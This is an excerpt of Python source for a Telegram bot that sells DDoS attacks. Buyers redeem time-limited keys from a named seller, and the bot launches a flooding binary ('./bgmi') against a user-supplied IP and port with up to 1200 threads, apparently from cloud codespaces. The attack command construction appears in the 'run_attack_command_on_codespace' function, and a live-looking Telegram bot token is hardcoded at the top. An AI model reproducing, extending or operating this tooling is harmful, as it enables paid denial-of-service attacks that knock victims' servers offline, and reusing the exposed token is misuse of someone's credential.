...
BOT_TOKEN = "7424238580:AAGt7HpPHqJLIvDHm68yL_4KWaTLU-Um0kY"
thread_count = 1200
...
def set_thread_count(message):
    global thread_enabled, thread_count
    ...
    if len(args) < 2:
        bot.send_message(chat_id, "*Please specify either a thread count or 'disable'.*", parse_mode='Markdown')
        return
    ...
    if command == 'disable':
        ...
        bot.send_message(chat_id, "*Thread functionality disabled. Using basic attack mode.*", parse_mode='Markdown')
    elif command == 'enable':
        thread_enabled = True
        bot.send_message(chat_id, "*Thread functionality enabled.*", parse_mode='Markdown')
    else:
        try:
            new_thread_count = int(command)
            if new_thread_count <= 0:
                bot.send_message(chat_id, "*Thread count must be a positive number.*", parse_mode='Markdown')
                return
            thread_count = new_thread_count
            thread_enabled = True
            bot.send_message(chat_id, f"*Thread count set to {thread_count}.*", parse_mode='Markdown')
        except ValueError:
            bot.send_message(chat_id, "*Invalid input. Use a number or 'disable'.*", parse_mode='Markdown')
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        # Construct command based on thread status
        if thread_enabled:
            command = f"./bgmi {target_ip} {target_port} {duration} {thread_count}"
            thread_info = f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
        else:
            command = f"./bgmi {target_ip} {target_port} {duration}"
            thread_info = "𝗧𝗵𝗿𝗲𝗮𝗱𝘀: Disabled\n"
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @DARKVIPDDOSX"  
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By @DARKVIPDDOSX\n\n"
            f"Admin Commands:\n"
        ...
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! Developed By @SmokieOfficial\n\n"
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @DARKVIPDDOSX*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @DARKVIPDDOSX.*", parse_mode='Markdown')
        return
    ...
    if is_super_admin(user_id):
        ...
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
                ...
                "Contact @DARKVIPDDOSX for assistance."
            )
        else:
            account_info = (
        ...
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @DARKVIPDDOSX."
